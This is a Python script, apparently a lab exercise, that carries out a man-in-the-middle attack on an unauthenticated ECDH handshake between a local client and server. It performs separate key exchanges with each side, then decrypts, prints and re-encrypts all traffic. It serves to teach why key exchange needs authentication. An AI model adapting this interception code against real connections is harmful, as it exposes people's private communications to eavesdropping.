import socket
import threading
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import os

# Global constants
REAL_SERVER_HOST = 'localhost'
REAL_SERVER_PORT = 9999
MITM_LISTEN_PORT = 8888

# derive_aes_key function is identical to the baseline
def derive_aes_key(shared_secret):
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data',
        backend=default_backend()
    )
    return hkdf.derive(shared_secret)

# This function acts like a SERVER (Receives first)
def perform_handshake_as_server(socket_conn, name):
    print(f"[MITM] Performing handshake with {name} (as Server)...")
    # 1. Generate MITM's keys
    mitm_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    mitm_public_key = mitm_private_key.public_key()
    mitm_public_key_bytes = mitm_public_key.public_bytes(
        encoding=Encoding.X962,
        format=PublicFormat.UncompressedPoint
    )

    # 2. Receive the other party's public key
    other_public_key_bytes = socket_conn.recv(1024)
    other_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
        curve=ec.SECP256R1(),
        data=other_public_key_bytes
    )

    # 3. Send MITM's public key
    socket_conn.sendall(mitm_public_key_bytes)

    # 4. Derive shared secret and AES key
    shared_secret = mitm_private_key.exchange(ec.ECDH(), other_public_key)
    aes_key = derive_aes_key(shared_secret)
    print(f"[MITM] Handshake with {name} complete. AES key derived.")
    return AESGCM(aes_key)

# !!! NEW FUNCTION !!!
# This function acts like a CLIENT (Sends first)
def perform_handshake_as_client(socket_conn, name):
    print(f"[MITM] Performing handshake with {name} (as Client)...")
    # 1. Generate MITM's keys
    mitm_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    mitm_public_key = mitm_private_key.public_key()
    mitm_public_key_bytes = mitm_public_key.public_bytes(
        encoding=Encoding.X962,
        format=PublicFormat.UncompressedPoint
    )

    # 2. Send MITM's public key
    socket_conn.sendall(mitm_public_key_bytes)

    # 3. Receive the other party's public key
    other_public_key_bytes = socket_conn.recv(1024)
    other_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
        curve=ec.SECP256R1(),
        data=other_public_key_bytes
    )

    # 4. Derive shared secret and AES key
    shared_secret = mitm_private_key.exchange(ec.ECDH(), other_public_key)
    aes_key = derive_aes_key(shared_secret)
    print(f"[MITM] Handshake with {name} complete. AES key derived.")
    return AESGCM(aes_key)


# This function will run in a thread to relay and intercept data
def relay_and_intercept(source_socket, dest_socket, decrypt_key, encrypt_key, source_name):
    try:
        while True:
            # Receive an encrypted message from the source
            encrypted_message = source_socket.recv(1024)
            if not encrypted_message:
                break
            
            # 1. Decrypt the message
            nonce = encrypted_message[:12]
            ciphertext = encrypted_message[12:]
            
            try:
                decrypted_message = decrypt_key.decrypt(nonce, ciphertext, None)
                
                # 2. !!! THE ATTACK !!!
                # Print the intercepted plaintext
                print(f"\n[MITM] --- INTERCEPTED from {source_name} ---")
                print(f"[MITM] Plaintext: {decrypted_message.decode()}")
                print(f"[MITM] --- END INTERCEPT ---\n")

                # 3. Re-encrypt with the *other* key
                new_nonce = os.urandom(12)
                new_ciphertext = encrypt_key.encrypt(new_nonce, decrypted_message, None)
                
                # 4. Relay to the destination
                dest_socket.sendall(new_nonce + new_ciphertext)
            
            except Exception as e:
                print(f"[MITM] Decryption failed: {e}. (Wrong key or corrupt data)")
                break

    except ConnectionResetError:
        print(f"[MITM] {source_name} disconnected.")
    finally:
        source_socket.close()
        dest_socket.close()


def main():
    # 1. Set up a socket to listen for the client
    mitm_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_server_socket.bind(('localhost', MITM_LISTEN_PORT))
    mitm_server_socket.listen(1)
    print(f"MITM Attack Server listening on port {MITM_LISTEN_PORT}...")

    client_socket, client_addr = mitm_server_socket.accept()
    print(f"[MITM] Client connected from {client_addr}")

    # 2. As soon as client connects, connect to the real server
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((REAL_SERVER_HOST, REAL_SERVER_PORT))
        print(f"[MITM] Connected to real server at {REAL_SERVER_HOST}:{REAL_SERVER_PORT}")
    except ConnectionRefusedError:
        print(f"[MITM] !!! Real server is not running. Please start server.py !!!")
        client_socket.close()
        mitm_server_socket.close()
        return

    # 3. Perform two separate handshakes
    
    # !!! CHANGE 1 !!!
    # Handshake 1: MITM (as Server) <-> Client
    aes_key_client = perform_handshake_as_server(client_socket, "CLIENT")
    
    # !!! CHANGE 2 !!!
    # Handshake 2: MITM (as Client) <-> Server
    aes_key_server = perform_handshake_as_client(server_socket, "SERVER")

    # 4. Start relaying data in both directions using threads
    print("\n[MITM] Handshakes complete. Now relaying and intercepting all traffic.\n")
    
    # Thread to handle Client -> Server
    t1 = threading.Thread(target=relay_and_intercept, 
                          args=(client_socket, server_socket, aes_key_client, aes_key_server, "CLIENT"))
    
    # Thread to handle Server -> Client
    t2 = threading.Thread(target=relay_and_intercept, 
                          args=(server_socket, client_socket, aes_key_server, aes_key_client, "SERVER"))

    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
    print("[MITM] Both connections closed. Attack complete.")
    mitm_server_socket.close()

if __name__ == "__main__":
    main()